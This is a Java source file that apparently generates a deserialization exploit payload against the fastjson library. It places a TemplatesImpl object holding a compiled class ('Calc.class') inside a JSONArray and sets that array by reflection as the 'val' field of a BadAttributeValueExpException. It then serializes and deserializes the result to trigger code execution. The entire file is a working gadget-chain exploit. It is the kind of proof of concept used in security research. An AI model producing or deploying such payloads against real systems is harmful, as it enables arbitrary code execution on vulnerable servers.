package tools;

import com.alibaba.fastjson.JSONArray;
import javassist.CannotCompileException;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.IOException;
import java.util.ArrayList;

public class PayloadGen {
    public static void main(String[] args) throws IOException, CannotCompileException, IllegalAccessException, ClassNotFoundException {
        Object payload = getPayload();
        byte[] bytes = ReflectTools.ser2bytes(payload);
        ReflectTools.deser(bytes, null);
    }

    public static Object getPayload() throws IOException, CannotCompileException, IllegalAccessException {
        Templates templates = TemplatesGen.getTemplates2(null, "D:/1tmp/classes/Calc.class");
        ArrayList<Object> arrayList = new ArrayList<>();
        arrayList.add(templates);
        JSONArray jsonArray = new JSONArray();
        jsonArray.add(templates);

        BadAttributeValueExpException bad = new BadAttributeValueExpException("aaa");
        ReflectTools.setFieldValue(bad, "val", jsonArray);

        arrayList.add(bad);

        return arrayList;
    }
}
